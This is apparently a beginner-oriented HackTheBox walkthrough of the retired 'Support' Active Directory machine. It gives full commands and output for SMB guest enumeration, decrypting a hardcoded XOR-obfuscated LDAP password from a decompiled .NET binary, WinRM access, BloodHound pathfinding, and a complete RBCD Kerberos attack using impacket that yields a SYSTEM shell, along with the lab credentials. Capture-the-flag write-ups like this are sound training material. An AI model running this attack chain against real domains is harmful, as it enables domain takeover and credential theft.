---
title: "Support"
date: 2026-05-24
draft: false
platform: "htb"
type: "machine"
machine: "Support"
os: "windows"
difficulty: "easy"
retired: true
points: 20
category: "active-directory"
tags: ["active-directory", "smb", "ldap", "winrm", "bloodhound", "rbcd", "kerberos", "dotnet", "reverse-engineering", "evil-winrm", "impacket"]
summary: "Enumerate an SMB share, reverse-engineer a .NET binary to extract LDAP credentials, find a plaintext password in an LDAP info attribute, then escalate to SYSTEM via a BloodHound-discovered GenericAll edge and an RBCD Kerberos attack."
---

<p style="display:flex;justify-content:flex-start;align-items:center;gap:1rem;">
  <img src="/images/machines/support/logo.png" alt="Support logo" class="writeup-hero-logo" />
</p>

## Introduction

Support is an Easy-rated Windows Active Directory machine on HackTheBox. The attack chain involves:

- Enumerating an SMB share accessible via guest session
- Reverse engineering a custom .NET binary to extract hardcoded LDAP credentials
- Using those credentials to find a plaintext password stored in an LDAP user attribute
- Gaining a WinRM shell as the `support` user
- Using BloodHound to identify a `GenericAll` privilege on the Domain Controller
- Performing a Resource-Based Constrained Delegation (RBCD) attack to get a shell as `NT AUTHORITY\SYSTEM`

---

## Enumeration

### Nmap Scan

The first step in any engagement is always a port scan to understand what services are running.

```bash
nmap -sC -sV -vv -oN SupportTCP.txt -T5 10.129.230.181
```

**Breaking down every flag for beginners:**

| Flag | What it does |
|---|---|
| `-sC` | Run default scripts — probes services for extra info (e.g. SMB signing, HTTP titles) |
| `-sV` | Detect service versions — tells you exactly what software is running on each port |
| `-vv` | Very verbose — shows results as they come in, no need to wait for scan to finish |
| `-oN SupportTCP.txt` | Save output to a file in normal format — always save your scans! |
| `-T5` | Fastest timing template — aggressive speed, good for CTFs (use T3/T4 on real engagements) |

**Results:**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Domain:** `support.htb` | **Hostname:** `DC` | **OS:** Windows Server 2022

### What these ports tell us

| Port | Service | Why it matters |
|---|---|---|
| 88 | Kerberos | Confirms this is a Domain Controller |
| 389/3268 | LDAP | Can query AD objects if we get credentials |
| 445 | SMB | Worth testing for anonymous/guest access |
| 5985 | WinRM | Remote PowerShell — useful if we get valid creds |

> **Beginner tip:** Ports 88 (Kerberos) and 389 (LDAP) together almost always mean you're dealing with a Domain Controller. WinRM on 5985 is your target for getting an interactive shell.

---

## SMB Enumeration

### Testing for Guest/Anonymous Access

SMB is always one of the first things to test on a Windows box. We use **NetExec (nxc)** to check if a guest session is allowed:

```bash
nxc smb 10.129.230.181 -u 'guest' -p '' --shares
```

**Breaking down every flag for beginners:**

| Flag | Value | What it does |
|---|---|---|
| `smb` | — | The protocol to test against |
| `10.129.230.181` | — | The target IP address |
| `-u` | `guest` | Username to authenticate with |
| `-p` | `''` | Password — empty string means no password |
| `--shares` | — | List all SMB shares and show our permissions on each |

> **Beginner tip:** NetExec (nxc) replaced the older tool CrackMapExec (cme). It supports many protocols — `smb`, `ldap`, `winrm`, `ssh`, `rdp`, `mssql` and more. A `[+]` in the output means successful authentication. A `[-]` means it failed.

**Result:**

```
SMB  10.129.230.181  445  DC  [*] Windows Server 2022 Build 20348 x64
SMB  10.129.230.181  445  DC  [+] support.htb\guest:
SMB  10.129.230.181  445  DC  Share           Permissions     Remark
SMB  10.129.230.181  445  DC  ADMIN$                          Remote Admin
SMB  10.129.230.181  445  DC  C$                              Default share
SMB  10.129.230.181  445  DC  IPC$            READ            Remote IPC
SMB  10.129.230.181  445  DC  NETLOGON                        Logon server share
SMB  10.129.230.181  445  DC  support-tools   READ            support staff tools
SMB  10.129.230.181  445  DC  SYSVOL                          Logon server share
```

Guest login works and we have READ access to `support-tools` — a non-default share worth investigating.

> **Beginner tip:** `ADMIN$`, `C$`, `NETLOGON`, and `SYSVOL` are standard Windows shares. Any share that doesn't fit that pattern, like `support-tools`, is immediately suspicious and should be your first target.

### Listing Share Contents

First list the available shares:

```bash
smbclient -L //10.129.230.181 -U 'guest%'
```

Then connect to the share:

```bash
smbclient //10.129.230.181/support-tools -U 'guest%'
smb: \> ls
```

**Share contents:**

```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip        <-- non-standard!
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

Every file here is a well-known legitimate tool — except `UserInfo.exe.zip`. This is a custom internal binary and immediately stands out.

```bash
smb: \> get UserInfo.exe.zip
smb: \> exit
```

---

## Analysing UserInfo.exe

### Unpacking

```bash
unzip UserInfo.exe.zip -d UserInfo
cd UserInfo
ls
```

The archive contains `UserInfo.exe` and several supporting `.dll` files — confirming it's a .NET application.

### Decompiling with ilspycmd

.NET binaries are compiled to an intermediate language (IL) that can be decompiled back into readable C# source code. We use `ilspycmd` for this:

```bash
# Install ilspycmd
dotnet tool install ilspycmd -g --version 8.2.0.7535

# Decompile the binary
ilspycmd UserInfo.exe -p -o ./decompiled
```

### Finding the Interesting Files

```bash
find ./decompiled -name "*.cs" | xargs grep -iEl 'enc_password|ldap|password'
```

**Hits:**
- `UserInfo.Services/Protected.cs`
- `UserInfo.Services/LdapQuery.cs`

### Protected.cs — Hardcoded Encrypted Credentials

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        for (int i = 0; i < array.Length; i++)
        {
            array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array);
    }
}
```

### LdapQuery.cs — How the Password is Used

```csharp
string password = Protected.getPassword();
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

This confirms the decrypted password belongs to the `support\ldap` account and is used to query Active Directory.

### Decrypting the Password

The encryption scheme is:
1. Base64 decode the `enc_password` string
2. XOR each byte with the key `armando` (cycling through)
3. XOR again with `0xDF`

We replicate this in Python:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

array = base64.b64decode(enc_password)
result = bytes([b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(array)])
print(result.decode())
```

```bash
python3 exploit.py
```

**Decrypted password:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

> **Beginner tip:** Developers sometimes hardcode credentials in applications thinking encryption makes it safe. But if the decryption key is also in the binary, it's security through obscurity — not real security. Always decompile custom .NET binaries on AD boxes.

---

## LDAP Enumeration

### Verifying the Credentials

```bash
nxc ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```

**Result:** 20 domain users enumerated successfully.

### Dumping the Support User's Attributes

Now we query all attributes for the `support` user — paying close attention to non-standard fields:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(sAMAccountName=support)"
```

**Breaking down every flag for beginners:**

| Flag | Value | What it does |
|---|---|---|
| `-x` | — | Use simple authentication instead of SASL |
| `-H` | `ldap://10.129.230.181` | The URL of the LDAP server to connect to |
| `-D` | `support\ldap` | The account to bind (log in) as |
| `-w` | `nvEfEK16^...` | The password for the bind account |
| `-b` | `DC=support,DC=htb` | The base DN — where in the directory tree to start searching from |
| `"(sAMAccountName=support)"` | — | The search filter — only return objects where the username equals `support` |

**Understanding the `-b` flag (Base DN) in depth:**

Active Directory is structured like a tree, not a flat list. The `-b` flag tells `ldapsearch` where to start looking in that tree:

```
DC=support,DC=htb          ← -b starts here (root of the domain)
├── CN=Users
│   ├── CN=support         ← the user we want
│   ├── CN=ldap
│   └── CN=Administrator
├── CN=Computers
│   └── CN=DC
└── CN=Groups
    └── CN=Remote Management Users
```

**Key finding in the output:**

```
info: Ironside47pleasure40Watchful
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

Two critical things here:
1. The `info` field contains what looks like a plaintext password
2. The `support` user is a member of `Remote Management Users` — meaning they can use WinRM (port 5985)

> **Beginner tip:** The `info` field is a non-standard AD attribute that admins sometimes misuse to store notes or temporary passwords. It's rarely audited — always check it when enumerating AD users.

### Why ms-DS-MachineAccountQuota Matters

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(objectClass=domain)" ms-DS-MachineAccountQuota
```

**Result:** `ms-DS-MachineAccountQuota: 10`

This means any authenticated domain user can add up to 10 computer accounts to the domain — this becomes important during privilege escalation.

---

## Foothold — WinRM Shell

Port `5985` (WinRM) was open from the initial scan. Since `support` is a member of `Remote Management Users`, they are allowed to connect via WinRM and run PowerShell commands remotely.

We use **evil-winrm** to get an interactive shell:

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

| Flag | Value | What it does |
|---|---|---|
| `-i` | `10.129.230.181` | The target IP to connect to |
| `-u` | `support` | Username |
| `-p` | `Ironside47pleasure40Watchful` | Password |

Shell obtained as `support\support`.

> **Beginner tip:** WinRM (Windows Remote Management) on port 5985 is essentially SSH for Windows. If a user is in the `Remote Management Users` group and you have their password, `evil-winrm` gives you a full interactive PowerShell session.

---

## User Flag

```powershell
dir C:\Users\support\Desktop\
type C:\Users\support\Desktop\user.txt
```

✅ **User flag captured.**

---

## Privilege Escalation — BloodHound

### What is BloodHound?

BloodHound is an Active Directory auditing tool that maps relationships between AD objects (users, groups, computers) and identifies attack paths to Domain Admin. It's used by both attackers and defenders.

### Setting Up BloodHound CE

```bash
# Fix PostgreSQL collation issue
sudo -u postgres psql -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
sudo -u postgres psql -c "ALTER DATABASE postgres REFRESH COLLATION VERSION;"

# Start BloodHound
bloodhound-start
```

Navigate to `http://localhost:8080` and log in with `admin:admin`.

### Collecting AD Data

We use `bloodhound-python` to remotely collect AD data using our valid credentials:

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' \
  -d support.htb -ns 10.129.230.181 -c All
```

| Flag | Value | What it does |
|---|---|---|
| `-u` | `support` | Username to authenticate with |
| `-p` | `Ironside47pleasure40Watchful` | Password |
| `-d` | `support.htb` | The Active Directory domain name |
| `-ns` | `10.129.230.181` | Nameserver — points to the DC so domain names resolve correctly |
| `-c` | `All` | Collect everything — users, groups, computers, GPOs, sessions, ACLs |

### Finding the Attack Path

Using the **Pathfinding** tab in BloodHound:
- **Start:** `SUPPORT@SUPPORT.HTB`
- **End:** `DOMAIN ADMINS@SUPPORT.HTB`

**Attack path revealed:**

```
SUPPORT → MemberOf → SHARED SUPPORT ACCOUNTS → GenericAll → DC.SUPPORT.HTB → ... → DOMAIN ADMINS
```

The critical edge is **GenericAll** from the `SHARED SUPPORT ACCOUNTS` group to `DC.SUPPORT.HTB`. Since `support` is a member of that group, it inherits full control over the DC computer object.

> **Beginner tip:** `GenericAll` means full control — you can do anything to that object. On a computer object, this enables the RBCD attack, which lets you impersonate any domain user including Administrator.

---

## RBCD Attack

### What is RBCD?

Resource-Based Constrained Delegation (RBCD) is a Kerberos delegation feature that allows a computer to impersonate users on behalf of another computer. By abusing `GenericAll` on the DC, we can:

1. Create a fake computer account (possible because `ms-DS-MachineAccountQuota: 10`)
2. Configure the DC to trust our fake computer to impersonate users
3. Request a Kerberos ticket as Administrator
4. Use that ticket to get a SYSTEM shell

### Step 1 — Create a Fake Computer Account

```bash
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' \
  -computer-name 'FAKE$' -computer-pass 'FakePass123!'
```

**Result:** `Successfully added machine account FAKE$ with password FakePass123!`

### Step 2 — Configure RBCD

Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC to allow `FAKE$` to delegate:

```bash
impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' \
  -action write -delegate-to 'DC$' -delegate-from 'FAKE$'
```

| Flag | Value | What it does |
|---|---|---|
| `-action write` | — | Write/modify the delegation attribute |
| `-delegate-to` | `DC$` | The target computer that will be delegated TO (the DC) |
| `-delegate-from` | `FAKE$` | Our fake computer that is allowed to impersonate users ON the DC |

**Result:**
```
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on DC$ via S4U2Proxy
```

### Step 3 — Get a Service Ticket as Administrator

```bash
impacket-getST 'support.htb/FAKE$:FakePass123!' \
  -spn 'cifs/dc.support.htb' -impersonate Administrator
```

| Flag | Value | What it does |
|---|---|---|
| `-spn` | `cifs/dc.support.htb` | The Service Principal Name — `cifs` means SMB on the DC |
| `-impersonate` | `Administrator` | Request the ticket as if we ARE the Administrator |

**Result:** `Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`

### Step 4 — Set KRB5CCNAME and Get a Shell

`KRB5CCNAME` is an environment variable that tells Kerberos-aware tools where to find the ticket cache file:

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass dc.support.htb
```

| Flag | What it does |
|---|---|
| `-k` | Use Kerberos authentication (reads from `KRB5CCNAME`) |
| `-no-pass` | Don't prompt for a password — use the Kerberos ticket instead |
| `dc.support.htb` | The target hostname — must match the ticket (use hostname not IP with Kerberos) |

> **Beginner tip:** Kerberos is very picky about hostnames. Always use the hostname (`dc.support.htb`) not the IP address when using `-k`. Make sure `/etc/hosts` has the correct entry: `10.129.230.181 support.htb dc.support.htb`

Shell obtained as `NT AUTHORITY\SYSTEM`.

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

✅ **Root flag captured.**

---

## Credentials Summary

| Account | Password | Source |
|---|---|---|
| `support\ldap` | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` | UserInfo.exe decompilation |
| `support\support` | `Ironside47pleasure40Watchful` | LDAP `info` attribute |
| `FAKE$` | `FakePass123!` | Created during RBCD attack |

---

## Key Concepts Learned

| Concept | Description |
|---|---|
| **Guest SMB sessions** | Always test SMB with guest/anonymous — misconfigured shares are common |
| **.NET decompilation** | Custom binaries often contain hardcoded credentials — always decompile |
| **XOR encryption** | Common obfuscation in malware and internal tools — trivial to reverse |
| **LDAP `info` field** | Non-standard AD attribute commonly misused to store passwords |
| **WinRM (port 5985)** | Windows remote shell — accessible to `Remote Management Users` group members |
| **BloodHound** | Essential tool for mapping AD attack paths visually |
| **GenericAll** | Full control over an AD object — enables many attacks |
| **ms-DS-MachineAccountQuota** | Default value of 10 allows any domain user to create computer accounts |
| **RBCD attack** | Abuse delegation rights to impersonate Administrator via Kerberos |
| **KRB5CCNAME** | Environment variable pointing to Kerberos ticket cache for pass-the-ticket |
